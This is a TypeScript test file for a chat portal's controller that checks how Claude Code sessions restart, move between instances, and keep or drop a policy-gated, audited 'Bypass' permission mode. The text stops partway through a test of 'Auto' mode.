// Restart (reconnect), Bypass across a deliberate restart or a move, and the Auto permission mode (chat-sessions PRD: Restart, FR20, Auto).
// A Restart stops the process at a turn boundary and resumes the same Claude Code session on a fresh segment, so its MCP servers
// reconnect; a move or a Restart keeps Bypass only while the policy allows it, through the same grant as entering it; Auto is only for
// a person's own session, asked by a person in the app.

import assert from 'node:assert/strict';
import { randomUUID } from 'node:crypto';
import { test } from 'node:test';
import { isAppError } from '@isnanme/core';
import type { ChatServerMessage } from '@portal/contracts';
import type { Workspaces } from '../workspaces/manager.js';
import { ChatController } from './controller.js';
import { parseLine } from './protocol.js';
import { APPLIED, fail, firstTurn, init, line, liveSession, ok, sleep, until, USAGE_API_KEY, vanish, type Live } from './testkit.js';

const FLAG = '--allow-dangerously-skip-permissions';
const code = (p: Promise<unknown>) => p.then(() => 'ok', (e: unknown) => (isAppError(e) ? e.code : String(e)));
const result = (sessionId: string) =>
  line({ type: 'result', subtype: 'success', total_cost_usd: 0.01, duration_ms: 10, usage: { input_tokens: 1, output_tokens: 1 }, is_error: false, session_id: sessionId });
const assistantText = (text: string) => line({ type: 'assistant', message: { content: [{ type: 'text', text }] }, parent_tool_use_id: null, uuid: randomUUID() });
const lastStart = (s: Live) => s.ws.startArgs.at(-1)!;
const csidOf = (s: Live, id: string) => s.controller.get(id)!.claudeSessionId;

function policy(s: Live, allowed: boolean) {
  const state = { allowed, fresh: true };
  s.controller.bypassAllowed = () => state.allowed;
  s.controller.reauth = { fresh: (token) => token === 'tok' && state.fresh };
  return state;
}

/** A bypass-capable session a person started, past its first turn, in Bypass; its reader is the newest tail. */
async function inBypass(s: Live) {
  const before = s.ws.tails.length;
  const { id } = await s.controller.create({ workspaceId: 'docker/ws1' }, { bypassOptIn: true });
  await until(() => s.ws.tails.length === before + 1);
  await until(() => s.controller.get(id)?.state === 'idle');
  await sleep(20);
  const tail = s.ws.tails.at(-1)!;
  tail.push(init(id));
  tail.push(ok((await s.take('get_settings')).id, APPLIED));
  await until(() => s.controller.get(id)!.effort === 'medium');
  const entering = s.controller.enterBypass(id, { acknowledged: true, sessionToken: 'tok' });
  tail.push(ok((await s.take('set_permission_mode')).id, { mode: 'bypassPermissions' }));
  await entering;
  assert.equal(s.controller.get(id)!.mode, 'bypassPermissions');
  return id;
}

/** The newest process answers each `set_permission_mode` the portal asks with the mode it asked for, until `p` settles. */
async function modesAnswered<T>(s: Live, p: Promise<T>, reply: (mode: string) => 'ok' | string = () => 'ok'): Promise<T> {
  let settled = false;
  p.then(
    () => (settled = true),
    () => (settled = true),
  );
  const seen = new Set<string>(controlsOf(s).map((c) => c.id)); // only what is asked from now on
  while (!settled) {
    for (const c of controlsOf(s)) {
      if (seen.has(c.id) || c.request.subtype !== 'set_permission_mode') continue;
      seen.add(c.id);
      const mode = String(c.request.mode);
      const r = reply(mode);
      s.ws.tails.at(-1)!.push(r === 'ok' ? ok(c.id, { mode }) : fail(c.id, r));
    }
    await sleep(5);
  }
  return p;
}
function controlsOf(s: Live) {
  return s.ws.sends.flatMap((x) => {
    try {
      const o = JSON.parse(x.line) as { type?: string; request_id?: string; request?: Record<string, unknown> };
      return o.type === 'control_request' && o.request_id && o.request ? [{ id: o.request_id, request: o.request }] : [];
    } catch {
      return [];
    }
  });
}
const bypassAsks = (s: Live) => controlsOf(s).filter((c) => c.request.subtype === 'set_permission_mode' && c.request.mode === 'bypassPermissions').length;

/* ---------- Restart ---------- */

test('restart: stops the process at a turn boundary and resumes the same Claude Code session on a new segment; settings come back; marked and audited', async () => {
  const s = await liveSession();
  try {
    s.controller.controlTimeoutMs = 150;
    await firstTurn(s);
    const m = s.controller.control(s.id, 'mode', { mode: 'acceptEdits' });
    s.tail.push(ok((await s.take('set_permission_mode')).id, { mode: 'acceptEdits' }));
    await m;
    const before = s.controller.get(s.id)!;
    const starts = s.ws.startArgs.length;
    const seg = Number(lastStart(s)[2]);
    const restarted = await s.answering(modesAnswered(s, s.controller.restart(s.id, { why: 'mcp' })));
    assert.equal(s.ws.startArgs.length, starts + 1);
    const args = lastStart(s);
    assert.ok(args.includes('--resume') && args.includes(before.claudeSessionId), 'the same conversation, not a fork');
    assert.ok(!args.includes('--fork-session') && !args.includes('--session-id'));
    assert.equal(Number(args[2]), seg + 1, 'a fresh log segment');
    assert.ok(s.ws.ops.lastIndexOf(`stop ${before.claudeSessionId}`) < s.ws.ops.lastIndexOf('start'), 'the old process stops first');
    assert.equal(restarted.claudeSessionId, before.claudeSessionId);
    assert.equal(restarted.mode, 'acceptEdits', 'the mode came back');
    assert.equal(restarted.process, 'live');
    const divider = s.controller.history(s.id).findLast((e) => e.kind === 'system' && e.restart === true);
    assert.equal(divider?.text, 'Restarted: MCP reconnected');
    assert.deepEqual(
      s.controller.audit({ kind: 'session.restart' }).map((a) => [a.severity, a.actor, a.detail]),
      [['info', 'ui', { why: 'mcp', agents: 0, bypass: 'none' }]],
    );
  } finally {
    await s.done();
  }
});

test('restart: refused while a turn runs, an approval waits, after the end, for a bad reason, and never at once with a move', async () => {
  const s = await liveSession();
  try {
    s.controller.controlTimeoutMs = 150;
    await firstTurn(s);
    assert.equal(await code(s.controller.restart(s.id, { why: 'because' })), 'VALIDATION_FAILED');
    await s.controller.send(s.id, 'm1', 'working on it');
    assert.equal(await code(s.controller.restart(s.id)), 'CONFLICT', 'working');
    s.tail.push(line({ type: 'control_request', request_id: 'R1', request: { subtype: 'can_use_tool', tool_name: 'Bash', input: { command: 'ls' }, tool_use_id: 'toolu_1' } }));
    await until(() => s.controller.get(s.id)!.waiting === 1);
    assert.equal(await code(s.controller.restart(s.id)), 'CONFLICT', 'an approval waits: it is answered first, never dropped silently');
    await s.controller.respond(s.id, 'R1', 'deny');
    s.tail.push(line({ type: 'command_lifecycle', command_uuid: 'm1', state: 'completed' }));
    s.tail.push(result(s.id));
    await until(() => s.state() === 'idle');
    const stopsBefore = s.ws.stops;

    // A restart holds the chat: a move is refused, and a second restart too. (The start is held so the restart stays in flight.)
    let release!: () => void;
    s.ws.startGate = new Promise<void>((r) => (release = r));
    const work = await s.controller.createClaude('docker/ws1', 'Work');
    const restarting = s.answering(s.controller.restart(s.id));
    await until(() => s.controller.get(s.id)!.restarting === true);
    assert.equal(await code(s.controller.switchClaude(s.id, work.id, { handoff: 'skip' })), 'CONFLICT');
    assert.equal(await code(s.controller.restart(s.id)), 'CONFLICT');
    assert.equal(await code(s.controller.allowBypass(s.id)), 'CONFLICT', 'nor a restart for Bypass');
    release();
    s.ws.startGate = null;
    await restarting;
    assert.equal(s.controller.get(s.id)!.restarting, undefined);
    assert.equal(s.ws.stops, stopsBefore + 1);

    await s.controller.end(s.id);
    assert.equal(await code(s.controller.restart(s.id)), 'CONFLICT', 'ended');
  } finally {
    await s.done();
  }
});

test('restart: a move under way refuses it', async () => {
  const s = await liveSession();
  try {
    s.controller.controlTimeoutMs = 150;
    s.controller.ackWaitMs = 300;
    await firstTurn(s);
    const work = await s.controller.createClaude('docker/ws1', 'Work');
    const moving = s.controller.switchClaude(s.id, work.id, { handoff: 'skip' }).catch(() => undefined);
    await until(() => s.controller.get(s.id)!.switching !== null);
    assert.equal(await code(s.controller.restart(s.id)), 'CONFLICT');
    await moving;
  } finally {
    await s.done();
  }
});

test('restart: messages sent while it runs wait for the new process and reach it in the order they were sent', async () => {
  const s = await liveSession();
  try {
    s.controller.controlTimeoutMs = 150;
    await firstTurn(s);
    let release!: () => void;
    s.ws.startGate = new Promise<void>((r) => (release = r));
    const restarting = s.answering(s.controller.restart(s.id));
    await until(() => s.ws.stops >= 1);
    const sent = [s.controller.send(s.id, 'a1', 'FIRST message'), s.controller.send(s.id, 'a2', 'SECOND message'), s.controller.send(s.id, 'a3', 'THIRD message')];
    await sleep(50);
    assert.ok(!s.ws.sends.some((x) => x.line.includes('FIRST message')), 'nothing went to the old process, nothing was lost');
    release();
    s.ws.startGate = null;
    await restarting;
    await Promise.all(sent);
    const order = ['FIRST', 'SECOND', 'THIRD'].map((w) => s.ws.sends.findIndex((x) => x.line.includes(`${w} message`)));
    assert.ok(order.every((i) => i >= 0) && order[0]! < order[1]! && order[1]! < order[2]!, `in order: ${order}`);
    assert.ok(s.ws.sends.filter((x) => /(FIRST|SECOND|THIRD) message/.test(x.line)).every((x) => x.args[1] === s.controller.get(s.id)!.claudeSessionId));
  } finally {
    await s.done();
  }
});

test('restart: running background agents stop with the old process and are counted in the audit; the hint follows deliveries', async () => {
  const s = await liveSession();
  try {
    s.controller.controlTimeoutMs = 150;
    await firstTurn(s);
    s.tail.push(line({ type: 'system', subtype: 'task_started', task_id: 'bg1', description: 'watcher', task_type: 'local_bash', is_backgrounded: true }));
    await until(() => s.controller.tasks(s.id).some((t) => t.status === 'running'));

    // The hint: a delivery that landed after the process started; one before it doesn't count.
    let landed: string | null = new Date(Date.now() - 60_000).toISOString();
    s.controller.deliveredAt = () => landed;
    assert.equal(s.controller.get(s.id)!.configChangedAt, undefined, 'older than the process');
    const sessionsBefore = s.messages.filter((m) => m.type === 'session').length;
    landed = new Date(Date.now() + 1000).toISOString();
    s.controller.deliveryChanged('docker/ws1');
    s.controller.deliveryChanged('docker/ws1'); // the same time again tells nobody
    assert.equal(s.messages.filter((m) => m.type === 'session').length, sessionsBefore + 1);
    const told = s.messages.findLast((m): m is Extract<ChatServerMessage, { type: 'session' }> => m.type === 'session')!;
    assert.equal(told.session.configChangedAt, landed);
    assert.equal(s.controller.get(s.id)!.configChangedAt, landed);

    await sleep(1100);
    await s.answering(s.controller.restart(s.id, { why: 'mcp' }));
    assert.equal(s.controller.get(s.id)!.configChangedAt, undefined, 'the new process has read it');
    assert.ok(s.controller.tasks(s.id).every((t) => t.status !== 'running'));
    assert.equal(s.controller.audit({ kind: 'session.restart' })[0]!.detail.agents, 1);
    s.controller.deliveredAt = () => {
      throw new Error('db gone');
    };
    assert.equal(s.controller.get(s.id)!.configChangedAt, undefined, 'a failing reader shows no hint and breaks nothing');
  } finally {
    await s.done();
  }
});

/* ---------- Bypass across a deliberate restart ---------- */

test('restart keeps Bypass: relaunched with the flag and switched back through the grant, without the confirmation again; High audit; then it is expected', async () => {
  const s = await liveSession();
  try {
    s.controller.controlTimeoutMs = 150;
    const state = policy(s, true);
    const id = await inBypass(s);
    state.fresh = false; // no server code check this time: the person already did it for this chat
    const restarted = await s.answering(modesAnswered(s, s.controller.restart(id)));
    assert.ok(lastStart(s).includes(FLAG) && lastStart(s).includes('--resume'));
    assert.equal(restarted.mode, 'bypassPermissions');
    assert.ok(s.controller.history(id).some((e) => e.kind === 'system' && e.text === 'Bypass kept after the restart.'));
    const entered = s.controller.audit({ kind: 'bypass.entered' });
    assert.equal(entered.length, 2);
    assert.deepEqual([entered[0]!.severity, entered[0]!.actor, entered[0]!.detail.how], ['high', 'portal', 'restart']);
    assert.equal(s.controller.audit({ kind: 'bypass.left' }).length, 0, 'never reported as left');
    assert.equal(s.controller.audit({ kind: 'session.restart' })[0]!.detail.bypass, 'kept');
    // The new process reports Bypass on its turns: expected, not an integrity end.
    s.ws.tails.at(-1)!.push(init(csidOf(s, id), 'bypassPermissions'));
    await sleep(60);
    assert.notEqual(s.controller.get(id)!.state, 'ended');
  } finally {
    await s.done();
  }
});

test('T-277: after a portal restart, a process that reports default while the row says Bypass is a downgrade: alive, flagged, and the gated path brings Bypass back', async () => {
  const s = await liveSession();
  try {
    s.controller.controlTimeoutMs = 150;
    policy(s, true);
    await s.controller.end(s.id); // only the Bypass chat is attached after the restart
    const id = await inBypass(s);
    const csid = csidOf(s, id);

    // The portal restarts (a deploy): the expected mode comes back from the stored row, Bypass.
    s.controller.stop();
    const tails = s.ws.tails.length;
    const restarted = new ChatController(s.store, s.ws as unknown as Workspaces);
    const events: ChatServerMessage[] = [];
    restarted.onEvent((_id, msg) => events.push(msg));
    restarted.controlTimeoutMs = 150;
    restarted.bypassAllowed = () => true;
    restarted.reauth = { fresh: (token) => token === 'tok' };
    restarted.start();
    try {
      await until(() => s.ws.tails.length === tails + 1);
      await sleep(20);
      assert.equal(restarted.get(id)!.mode, 'bypassPermissions');
      // The process re-attached in default (observed: 3907db7f, 02:50:24 UTC, deploy #20).
      const tail = s.ws.tails.at(-1)!;
      tail.push(init(csid, 'default'));
      tail.push(line({ type: 'system', subtype: 'status', status: null, permissionMode: 'default', session_id: csid }));
      tail.push(assistantText('still here'));
      await until(() => restarted.history(id).some((e) => e.text === 'still here') || restarted.get(id)!.state === 'ended');
      const now = restarted.get(id)!;
      assert.notEqual(now.state, 'ended', now.endedReason ?? '');
      assert.equal(now.mode, 'default', 'the row shows the truth');
      assert.equal(restarted.history(id).filter((e) => e.kind === 'system' && e.text === 'Bypass is off in this chat').length, 1, 'one marker');
      assert.ok(events.some((m) => m.type === 'session' && m.session.id === id && m.session.mode === 'default'), 'the session event went out');
      assert.deepEqual(restarted.audit({ kind: 'bypass.left' }).map((a) => a.detail), [{ why: 'downgrade', mode: 'default' }]);
      assert.equal(bypassAsks(s), 1, 'the portal did not re-enter Bypass by itself');

      // Default is now expected: a more permissive report than that still ends the session (checked below on its own twin);
      // the gated path (acknowledgement, fresh server code) puts Bypass back.
      const entered = await modesAnswered(s, restarted.enterBypass(id, { acknowledged: true, sessionToken: 'tok' }));
      assert.equal(entered.mode, 'bypassPermissions');
      assert.equal(bypassAsks(s), 2);
      tail.push(init(csid, 'bypassPermissions'));
      await sleep(60);
      assert.notEqual(restarted.get(id)!.state, 'ended', restarted.get(id)!.endedReason ?? '');
    } finally {
      await restarted.end(id).catch(() => undefined);
      restarted.stop();
    }
  } finally {
    await s.done();
  }
});

test('T-277: after a portal restart with Bypass expected, an unknown mode string still ends the session with the same text', async () => {
  const s = await liveSession();
  try {
    s.controller.controlTimeoutMs = 150;
    policy(s, true);
    await s.controller.end(s.id);
    const id = await inBypass(s);
    const csid = csidOf(s, id);
    s.controller.stop();
    const tails = s.ws.tails.length;
    const restarted = new ChatController(s.store, s.ws as unknown as Workspaces);
    restarted.start();
    try {
      await until(() => s.ws.tails.length === tails + 1);
      await sleep(20);
      s.ws.tails.at(-1)!.push(init(csid, 'dontAsk'));
      await until(() => restarted.get(id)!.state === 'ended');
      assert.equal(restarted.get(id)!.endedReason, 'integrity: the permission mode changed to dontAsk without this portal (expected bypassPermissions)');
    } finally {
      restarted.stop();
    }
  } finally {
    await s.done();
  }
});

test('a move keeps Bypass: on the new Claude the chat is still in Bypass, launched with the flag, through the grant (so an automatic move with automove.allowBypass keeps it too)', async () => {
  const s = await liveSession();
  try {
    s.controller.controlTimeoutMs = 150;
    const state = policy(s, true);
    const id = await inBypass(s);
    state.fresh = false;
    const work = await s.controller.createClaude('docker/ws1', 'Work');
    const moving = modesAnswered(s, s.controller.switchClaude(id, work.id, { handoff: 'skip' }));
    // The new Claude acknowledges the opening: its init, a line, its result and the usage check.
    await until(() => csidOf(s, id) !== id);
    const nid = csidOf(s, id);
    await until(() => s.ws.sends.some((x) => x.args[1] === nid && x.line.includes('transferred_context')));
    const tail = s.ws.tails.at(-1)!;
    tail.push(init(nid));
    tail.push(assistantText('Got it.'));
    tail.push(result(nid));
    tail.push(ok((await s.take('get_usage')).id, USAGE_API_KEY));
    const moved = await moving;
    assert.equal(moved.claudeName, 'Work');
    assert.equal(moved.mode, 'bypassPermissions', 'still in Bypass on the new Claude');
    assert.ok(lastStart(s).includes(FLAG), 'the new process was launched with the flag');
    assert.ok(s.controller.history(id).some((e) => e.kind === 'system' && /Bypass kept/.test(e.text ?? '')));
    const entered = s.controller.audit({ kind: 'bypass.entered' });
    assert.deepEqual([entered[0]!.actor, entered[0]!.detail.how], ['portal', 'move'], 'the newest audit row: kept across the move');
  } finally {
    await s.done();
  }
});

test('restart with the policy now off: no flag, no request to enter Bypass, it is off, said so and audited', async () => {
  const s = await liveSession();
  try {
    s.controller.controlTimeoutMs = 150;
    const state = policy(s, true);
    const id = await inBypass(s);
    state.allowed = false;
    const asked = bypassAsks(s);
    const restarted = await s.answering(modesAnswered(s, s.controller.restart(id)));
    assert.ok(!lastStart(s).includes(FLAG));
    assert.equal(restarted.mode, 'default');
    assert.equal(bypassAsks(s), asked);
    assert.ok(s.controller.history(id).some((e) => e.text === 'Bypass turned off: Claude Code stopped.'));
    assert.deepEqual(s.controller.audit({ kind: 'bypass.left' }).map((a) => a.detail.why), ['stopped']);
    // A non-deliberate relaunch (a crash, then Resume) still drops it: FR20.
  } finally {
    await s.done();
  }
});

test('restart keeps Bypass: a switch that fails is retried once with a fresh process; failing again it stays off with a note and bypass.left restart_failed', async () => {
  const s = await liveSession();
  try {
    s.controller.controlTimeoutMs = 150;
    policy(s, true);
    const id = await inBypass(s);
    const starts = s.ws.startArgs.length;
    let n = 0;
    const restarted = await s.answering(modesAnswered(s, s.controller.restart(id), (mode) => (mode === 'bypassPermissions' && ++n <= 2 ? 'bypass_not_launched' : 'ok')));
    assert.equal(n, 2, 'asked twice: once, then once more after a fresh process');
    assert.equal(s.ws.startArgs.length, starts + 2, 'the restart, then the retry');
    assert.ok(lastStart(s).includes(FLAG));
    assert.equal(restarted.mode, 'default');
    assert.ok(s.controller.history(id).some((e) => e.kind === 'system' && /^Bypass not kept after the restart: Claude Code refused the switch/.test(e.text ?? '')));
    assert.deepEqual(s.controller.audit({ kind: 'bypass.left' }).map((a) => a.detail.why), ['restart_failed']);
    assert.equal(s.controller.audit({ kind: 'bypass.entered' }).length, 1, 'only the person’s own entry');
    // After that, a report of Bypass is a forgery again.
    s.ws.tails.at(-1)!.push(init(csidOf(s, id), 'bypassPermissions'));
    await until(() => s.controller.get(id)!.state === 'ended');
  } finally {
    await s.done();
  }
});

test('restart keeps Bypass: the policy turning off while the switch is in flight still wins (switched back out, audited)', async () => {
  const s = await liveSession();
  try {
    s.controller.controlTimeoutMs = 150;
    const state = policy(s, true);
    const id = await inBypass(s);
    const restarted = await s.answering(
      modesAnswered(s, s.controller.restart(id), (mode) => {
        if (mode === 'bypassPermissions') state.allowed = false; // flipped while Claude Code switches
        return 'ok';
      }),
    );
    assert.equal(restarted.mode, 'default');
    assert.ok(controlsOf(s).some((c) => c.request.subtype === 'set_permission_mode' && c.request.mode === 'default'), 'switched back out');
    assert.ok(s.controller.audit({ kind: 'bypass.left' }).some((a) => a.detail.why === 'policy'));
    assert.equal(s.controller.audit({ kind: 'bypass.entered' }).length, 1, 'never recorded as kept');
  } finally {
    await s.done();
  }
});

/* ---------- Bypass across a move ---------- */

/** The new run of a move takes the context: init, a reply, the end of its turn, the usage check. */
async function acknowledge(s: Live, id: string, oldCsid: string) {
  await until(() => csidOf(s, id) !== oldCsid);
  const nid = csidOf(s, id);
  const tail = s.ws.tails.at(-1)!;
  await until(() => s.ws.sends.some((x) => x.args[1] === nid && x.line.includes('transferred_context')));
  tail.push(init(nid));
  tail.push(assistantText('Got it.'));
  tail.push(result(nid));
  tail.push(ok((await s.take('get_usage')).id, USAGE_API_KEY));
  return nid;
}

test('move keeps Bypass: the destination Claude (its own directory and credential) starts with the flag, and Bypass comes back after the ack, audited', async () => {
  const s = await liveSession();
  try {
    s.controller.controlTimeoutMs = 150;
    const state = policy(s, true);
    const id = await inBypass(s);
    state.fresh = false;
    const work = await s.controller.createClaude('docker/ws1', 'Work');
    const old = csidOf(s, id);
    const moving = modesAnswered(s, s.controller.switchClaude(id, work.id, { handoff: 'skip' }));
    const nid = await acknowledge(s, id, old);
    const moved = await moving;
    assert.equal(moved.claudeName, 'Work');
    const start = s.ws.startArgs.find((a) => a.includes(nid))!;
    assert.ok(start.includes(FLAG), 'the new run allows the switch');
    assert.ok(s.ws.shells.some((x) => x.args.includes(work.directory) || x.args.some((a) => a.includes(work.directory))), 'in the destination Claude’s own directory');
    assert.equal(moved.mode, 'bypassPermissions');
    const events = s.controller.history(id);
    const movedAt = events.findIndex((e) => e.kind === 'system' && e.text === 'Moved to Work');
    const kept = events.findIndex((e) => e.kind === 'system' && e.text === 'Bypass kept after the move.');
    assert.ok(movedAt >= 0 && kept > movedAt, 'after the move is done, outside its card');
    const entered = s.controller.audit({ kind: 'bypass.entered' })[0]!;
    assert.deepEqual([entered.severity, entered.actor, entered.detail.how, entered.detail.claude], ['high', 'portal', 'move', 'Work']);
    // The ack turn ran on the start mode: Bypass was asked for only after the context was taken.
    const ackAt = s.ws.sends.findIndex((x) => x.args[1] === nid && x.line.includes('transferred_context'));
    const askAt = s.ws.sends.findIndex((x) => x.args[1] === nid && x.line.includes('"bypassPermissions"'));
    assert.ok(ackAt >= 0 && askAt > ackAt);
  } finally {
    await s.done();
  }
});

test('move with the policy off: the destination has no flag, Bypass is off after it, said so and audited (policy)', async () => {
  const s = await liveSession();
  try {
    s.controller.controlTimeoutMs = 150;
    const state = policy(s, true);
    const id = await inBypass(s);
    state.allowed = false;
    const work = await s.controller.createClaude('docker/ws1', 'Work');
    const old = csidOf(s, id);
    const asked = bypassAsks(s);
    const moving = modesAnswered(s, s.controller.switchClaude(id, work.id, { handoff: 'skip' }));
    const nid = await acknowledge(s, id, old);
    const moved = await moving;
    assert.ok(!s.ws.startArgs.find((a) => a.includes(nid))!.includes(FLAG));
    assert.equal(moved.mode, 'default');
    assert.equal(bypassAsks(s), asked);
    assert.ok(s.controller.history(id).some((e) => e.text === 'Bypass not kept after the move: the policy no longer allows it.'));
    assert.deepEqual(s.controller.audit({ kind: 'bypass.left' }).map((a) => [a.detail.why, a.detail.how]), [['policy', 'move']]);
  } finally {
    await s.done();
  }
});

test('move keeps Bypass: a refused switch restarts the new run once with the flag (--resume of the new run) and asks again; two refusals drop it (move_failed)', async () => {
  for (const refusals of [1, 2]) {
    const s = await liveSession();
    try {
      s.controller.controlTimeoutMs = 150;
      policy(s, true);
      const id = await inBypass(s);
      const work = await s.controller.createClaude('docker/ws1', 'Work');
      const old = csidOf(s, id);
      let n = 0;
      const moving = s.answering(modesAnswered(s, s.controller.switchClaude(id, work.id, { handoff: 'skip' }), (mode) => (mode === 'bypassPermissions' && ++n <= refusals ? 'bypass_not_launched' : 'ok')));
      const nid = await acknowledge(s, id, old);
      const moved = await moving;
      assert.equal(moved.claudeName, 'Work', 'the move itself stands');
      const retry = s.ws.startArgs.at(-1)!;
      assert.ok(retry.includes('--resume') && retry.includes(nid) && retry.includes(FLAG), 'the restart approach, on the new run');
      assert.ok(s.ws.ops.includes(`stop ${nid}`));
      if (refusals === 1) {
        assert.equal(moved.mode, 'bypassPermissions');
        assert.equal(s.controller.audit({ kind: 'bypass.entered' })[0]!.detail.how, 'move');
      } else {
        assert.equal(moved.mode, 'default');
        assert.deepEqual(s.controller.audit({ kind: 'bypass.left' }).map((a) => a.detail.why), ['move_failed']);
        assert.ok(s.controller.history(id).some((e) => /^Bypass not kept after the move: Claude Code refused the switch/.test(e.text ?? '')));
      }
    } finally {
      await s.done();
    }
  }
});

test('move rollback: a move that doesn’t finish leaves the old run in Bypass, as it was, and records nothing as left', async () => {
  const s = await liveSession();
  try {
    s.controller.controlTimeoutMs = 150;
    s.controller.ackWaitMs = 300;
    policy(s, true);
    const id = await inBypass(s);
    const work = await s.controller.createClaude('docker/ws1', 'Work');
    const old = csidOf(s, id);
    const moving = code(s.controller.switchClaude(id, work.id, { handoff: 'skip' }));
    await until(() => csidOf(s, id) !== old);
    const nid = csidOf(s, id);
    s.ws.tails.at(-1)!.push(init(nid)); // the new run reports the start mode, then never acknowledges
    assert.equal(await moving, 'SERVICE_UNAVAILABLE');
    const now = s.controller.get(id)!;
    assert.equal(now.claudeSessionId, old);
    assert.equal(now.mode, 'bypassPermissions', 'the old run kept running in Bypass');
    assert.equal(s.controller.audit({ kind: 'bypass.left' }).length, 0);
    // The old run's next turn reports Bypass: expected.
    s.ws.tails.at(-1)!.push(init(old, 'bypassPermissions'));
    await sleep(60);
    assert.notEqual(s.controller.get(id)!.state, 'ended');
  } finally {
    await s.done();
  }
});

/* ---------- T-256: the supervisor's move, and what happened to the Event chat ---------- */

/** The Claude the chat runs on answers the portal's handoff request (the supervisor asks for one unless the source is spent). */
async function writeHandoff(s: Live, sessionId: string, tail: Live['tail']) {
  await until(() => s.ws.sends.some((x) => x.line.includes('context-transfer document')));
  tail.push(assistantText('GOAL: the Event program. NEXT: the open tickets.'));
  tail.push(result(sessionId));
  tail.push(ok((await s.take('get_usage')).id, USAGE_API_KEY));
}

test('T-256: the supervisor’s move (POST /switch with the handoff asked for) keeps Bypass: the handoff on the old run, the ack on the start mode, then “Bypass kept after the move.”', async () => {
  const s = await liveSession();
  try {
    s.controller.controlTimeoutMs = 150;
    const state = policy(s, true);
    const id = await inBypass(s);
    state.fresh = false; // nobody re-entered the server code for the move: the person's earlier confirmation carries it
    const sekar = await s.controller.createClaude('docker/ws1', 'sekar');
    const old = csidOf(s, id);
    const oldTail = s.ws.tails.at(-1)!;
    const moving = modesAnswered(s, s.controller.switchClaude(id, sekar.id, { handoff: 'ask' }));
    await writeHandoff(s, id, oldTail);
    const nid = await acknowledge(s, id, old);
    const moved = await moving;
    assert.equal(moved.claudeName, 'sekar');
    assert.ok(s.ws.startArgs.find((a) => a.includes(nid))!.includes(FLAG));
    assert.equal(moved.mode, 'bypassPermissions');
    assert.ok(s.controller.history(id).some((e) => e.kind === 'system' && e.text === 'Bypass kept after the move.'));
    assert.deepEqual(
      s.controller.audit({ kind: 'bypass.entered' }).map((a) => [a.actor, a.detail.how ?? 'person']).reverse(),
      [
        ['ui', 'person'],
        ['portal', 'move'],
      ],
    );
  } finally {
    await s.done();
  }
});

test('T-256: the supervisor’s move with the policy off: the chat comes back on the start mode and the transcript says “Bypass not kept after the move: …” (never pretended)', async () => {
  const s = await liveSession();
  try {
    s.controller.controlTimeoutMs = 150;
    const state = policy(s, true);
    const id = await inBypass(s);
    state.allowed = false;
    const sekar = await s.controller.createClaude('docker/ws1', 'sekar');
    const old = csidOf(s, id);
    const oldTail = s.ws.tails.at(-1)!;
    const asked = bypassAsks(s);
    const moving = modesAnswered(s, s.controller.switchClaude(id, sekar.id, { handoff: 'ask' }));
    await writeHandoff(s, id, oldTail);
    const nid = await acknowledge(s, id, old);
    const moved = await moving;
    assert.ok(!s.ws.startArgs.find((a) => a.includes(nid))!.includes(FLAG), 'no flag without the policy');
    assert.equal(moved.mode, 'default');
    assert.equal(bypassAsks(s), asked, 'Bypass is never asked for');
    assert.ok(s.controller.history(id).some((e) => e.kind === 'system' && e.text === 'Bypass not kept after the move: the policy no longer allows it.'));
    assert.ok(!s.controller.history(id).some((e) => e.kind === 'system' && /^Bypass kept/.test(e.text ?? '')));
    assert.deepEqual(s.controller.audit({ kind: 'bypass.left' }).map((a) => [a.detail.why, a.detail.how]), [['policy', 'move']]);
  } finally {
    await s.done();
  }
});

test('T-256 replay: the move keeps Bypass, the idle chat sleeps out of it, and a portal message wakes it on the start mode (FR20, FR38); the person’s re-entry then works without a restart', async () => {
  const s = await liveSession({ idleSleepMs: 1500 }, true);
  try {
    s.controller.controlTimeoutMs = 150;
    policy(s, true);
    const id = await inBypass(s);
    const sekar = await s.controller.createClaude('docker/ws1', 'sekar');
    const old = csidOf(s, id);
    const moving = modesAnswered(s, s.controller.switchClaude(id, sekar.id, { handoff: 'skip' }));
    const nid = await acknowledge(s, id, old);
    assert.equal((await moving).mode, 'bypassPermissions', 'the move kept it (the Event chat: out.0 of the new run, 18:31)');
    // Nobody speaks after the move: the chat sits idle and sleeps, and Bypass ends with its process, said so.
    // Claude Code reports the opening done (as it does after every turn), so nothing holds the sleep off.
    const opening = s.controller.history(id).findLast((e) => e.kind === 'user' && e.transfer)!;
    s.ws.tails.at(-1)!.push(line({ type: 'command_lifecycle', command_uuid: opening.uuid, state: 'completed', uuid: randomUUID(), session_id: nid }));
    await until(() => s.controller.get(id)!.process === 'asleep', 8000);
    assert.equal(s.controller.get(id)!.mode, 'default');
    assert.ok(s.controller.history(id).some((e) => e.kind === 'system' && e.text === 'Bypass turned off after sleep.'));
    // The supervisor's "continue" (19:33) wakes it: a resume of the same run on a new segment, on the start mode, Bypass not asked for.
    const asked = bypassAsks(s);
    const starts = s.ws.startArgs.length;
    await s.answering(s.controller.send(id, randomUUID(), 'Continue now.'));
    await until(() => s.controller.get(id)!.process === 'live');
    assert.equal(s.ws.startArgs.length, starts + 1);
    const wake = lastStart(s);
    assert.ok(wake.includes('--resume') && wake.includes(nid), 'the same run, resumed');
    assert.ok(wake.includes(FLAG), 'still launched so that Bypass can be entered again');
    assert.equal(s.controller.get(id)!.mode, 'default', 'a wake never restores Bypass: the first tool asks (the Event chat waited 19:33 to 00:22)');
    assert.equal(bypassAsks(s), asked);
    // What the supervisor does now on its round (T-256 item 3): the server code again, the acknowledgement, the one request.
    const entered = await modesAnswered(s, s.controller.enterBypass(id, { acknowledged: true, sessionToken: 'tok' }));
    assert.equal(entered.mode, 'bypassPermissions');
    assert.equal(s.ws.startArgs.length, starts + 1, 'no restart needed');
  } finally {
    await s.done();
  }
});

/* ---------- Auto ---------- */

test('auto: a person in the app turns it on for their own session; the portal expects it from then on; it is audited', async () => {
  const s = await liveSession();
  try {
    const turning = s.controller.control(s.id, 'mode', { mode: 'auto' }, { actor: 'ui' });
    const req = await s.take('set_permission_mode');
    assert.equal(req.request.mode, 'auto');
    s.tail.push(ok(req.id, { mode: 'auto' }));
    await turning;
    assert.equal(s.controller.get(s.id)!.mode, 'auto');
    assert.ok(s.controller.history(s.id).some((e) => e.kind === 'system' && e.text === 'Mode: Auto'));
    assert.deepEqual(s.controller.audit({ kind: 'mode.auto' }).map((a) => [a.severity, a.actor, a.detail.from]), [['medium', 'ui', 'default']]);
    s.tail.push(line({ type: 'system', subtype: 'status', status: null, permissionMode: 'auto' }));
    s.tail.push(init(s.id, 'auto'));
    await sleep(60);
